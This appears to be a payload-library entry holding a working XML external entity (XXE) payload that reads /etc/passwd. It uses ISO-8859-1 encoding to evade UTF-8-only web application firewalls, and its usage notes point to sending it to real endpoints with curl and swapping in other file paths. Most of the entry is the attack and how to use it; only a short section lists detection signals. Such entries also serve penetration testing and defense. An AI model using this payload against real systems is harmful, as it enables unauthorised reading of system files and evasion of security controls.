---
id: 4bcea00f-f2db-4d4f-8044-62d090f2f374
name: XXE-Payload-Encoded-Read-Etc-Passwd
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:44.134010+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Web
tags:
  - xxe
  - payload
  - file-read
  - encoded
validated: true
---

# XXE-Payload-Encoded-Read-Etc-Passwd

## Code

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

## Description

XXE payload with ISO-8859-1 encoding and 'foo' element to bypass basic filters on encoding or whitespace. The entity 'xxe' loads /etc/passwd, useful against WAFs that inspect UTF-8 only.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| file:///etc/passwd | File URI to resolve | file:///etc/hosts |
| ISO-8859-1 | Encoding to evade detection | UTF-8 |

## Usage

Send to endpoints with encoding-sensitive parsers via [[commands/curl-send-xxe-payload]]. Effective for evading simple signature-based defenses in legacy XML handlers.

## Detection

- Advanced WAF parsing multiple encodings for 'SYSTEM file://'.
- Log analysis for non-standard XML encodings in requests.
- Parser warnings on entity expansions in encoded input.

## Related

- [[procedures/File-Retrieval-via-XXE-Injection]]
